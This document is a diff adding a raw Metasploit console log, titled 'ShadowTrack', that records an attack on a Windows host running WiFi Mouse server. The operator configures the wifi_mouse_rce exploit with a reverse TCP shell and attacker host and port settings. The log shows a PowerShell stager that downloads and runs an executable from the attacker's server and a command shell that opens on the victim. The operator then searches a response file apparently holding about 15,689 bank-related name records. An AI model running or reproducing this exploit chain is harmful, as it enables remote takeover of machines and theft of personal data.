@@ -1,0 +1,117 @@
+ShadowTrack
+msf6 > search mouse
+
+Matching Modules
+================
+
+   #   Name                                                      Disclosure Date  Rank       Check  Description
+   -   ----                                                      ---------------  ----       -----  -----------
+   0   post/windows/manage/execute_dotnet_assembly               .                normal     No     Execute .net Assembly (x64 only)
+   1   exploit/multi/fileformat/libreoffice_macro_exec           2018-10-18       normal     No     LibreOffice Macro Code Execution
+   2     \_ target: Windows                                      .                .          .      .
+   3     \_ target: Linux                                        .                .          .      .
+   4   exploit/windows/browser/ie_setmousecapture_uaf            2013-09-17       normal     No     MS13-080 Microsoft Internet Explorer SetMouseCapture Use-After-Free
+   5     \_ target: Automatic                                    .                .          .      .
+   6     \_ target: Windows 7 with Office 2007|2010              .                .          .      .
+   7     \_ target: Windows XP with IE 8                         .                .          .      .
+   8   exploit/windows/misc/mobile_mouse_rce                     2022-09-20       normal     Yes    Mobile Mouse RCE
+   9   post/multi/manage/screenshare                             .                normal     No     Multi Manage the screen of the target meterpreter session
+   10  exploit/windows/misc/remote_mouse_rce                     2019-04-15       normal     Yes    Remote Mouse RCE
+   11  exploit/windows/misc/wifi_mouse_rce                       2021-02-25       normal     No     Wifi Mouse RCE
+   12  post/windows/gather/outlook                               .                normal     No     Windows Gather Outlook Email Messages
+   13    \_ action: LIST                                         .                .          .      Lists all folders
+   14    \_ action: SEARCH                                       .                .          .      Searches for an email
+   15  exploit/unix/webapp/wp_easycart_unrestricted_file_upload  2015-01-08       excellent  No     WordPress WP EasyCart Unrestricted File Upload
+
+
+Interact with a module by name or index. For example info 15, use 15 or use exploit/unix/webapp/wp_easycart_unrestricted_file_upload
+
+msf6 > use exploit/windows/misc/wifi_mouse_rce
+[*] Using configured payload windows/shell/reverse_tcp
+
+msf6 exploit(windows/misc/wifi_mouse_rce) > options
+
+Module options (exploit/windows/misc/wifi_mouse_rce):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   LINEMAX  1020             yes       Maximum length of lines to send for stager method.  Smaller for more unstable connections.
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    1978             yes       Port WiFi Mouse Mouse Server runs on (TCP)
+   SLEEP    1                yes       How long to sleep between commands
+   SSL      false            no        Negotiate SSL for incoming connections
+   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                   no        The URI to use for this exploit (default is random)
+
+
+   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT  8080             yes       The local port to listen on.
+
+
+Payload options (windows/shell/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST                      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   stager
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/misc/wifi_mouse_rce) > set RHOSTS 172.20.30.99
+RHOSTS => 172.20.30.99
+msf6 exploit(windows/misc/wifi_mouse_rce) > set SRVHOST 10.8.28.244
+SRVHOST => 10.8.28.244
+msf6 exploit(windows/misc/wifi_mouse_rce) > set SRVPORT 8080
+SRVPORT => 8080
+msf6 exploit(windows/misc/wifi_mouse_rce) > set payload windows/shell/reverse_tcp
+payload => windows/shell/reverse_tcp
+msf6 exploit(windows/misc/wifi_mouse_rce) > set LHOST 10.8.28.244
+LHOST => 10.8.28.244
+msf6 exploit(windows/misc/wifi_mouse_rce) > set LPORT 4444
+LPORT => 4444
+msf6 exploit(windows/misc/wifi_mouse_rce) > set LINEMAX 600
+LINEMAX => 600
+msf6 exploit(windows/misc/wifi_mouse_rce) > set VERBOSE true
+VERBOSE => true
+msf6 exploit(windows/misc/wifi_mouse_rce) > exploit
+[*] Started reverse TCP handler on 10.8.28.244:4444 
+[*] 172.20.30.99:1978 - Opening command prompt
+[*] 172.20.30.99:1978 - Typing out payload
+[*] 172.20.30.99:1978 - Using URL: http://10.8.28.244:8080/Muu6vT9cHp5wQ
+[*] 172.20.30.99:1978 - Generated command stager: ["powershell.exe -c Invoke-WebRequest -OutFile %TEMP%\\BUtIGbAM.exe http://10.8.28.244:8080/Muu6vT9cHp5wQ & %TEMP%\\BUtIGbAM.exe & del %TEMP%\\BUtIGbAM.exe"]
+[*] 172.20.30.99:1978 - Command Stager progress - 100.00% done (150/150 bytes)
+[*] 172.20.30.99:1978 - Client 172.20.30.99 (Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.3930) requested /Muu6vT9cHp5wQ
+[*] 172.20.30.99:1978 - Sending payload to 172.20.30.99 (Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.3930)
+[*] Sending stage (240 bytes) to 172.20.30.99
+[*] Command shell session 1 opened (10.8.28.244:4444 -> 172.20.30.99:49965) at 2025-06-17 15:55:41 -0400
+[*] 172.20.30.99:1978 - Server stopped.
+
+
+Shell Banner:
+Microsoft Windows [Version 10.0.19045.3930]
+-----
+          
+C:\Users\Harry\Desktop> type response.txt | findstr /i "http"
+ type response.txt | findstr /i "http"
+HTTP/2 200 OK
+Access-Control-Allow-Origin: https://trustbank.hv
+
+C:\Users\Harry\Desktop>
+C:\Users\Harry\Desktop>findstr /i /c:"\"name\":" response.txt | find /c /v ""
+findstr /i /c:"\"name\":" response.txt | find /c /v ""
+15689
+
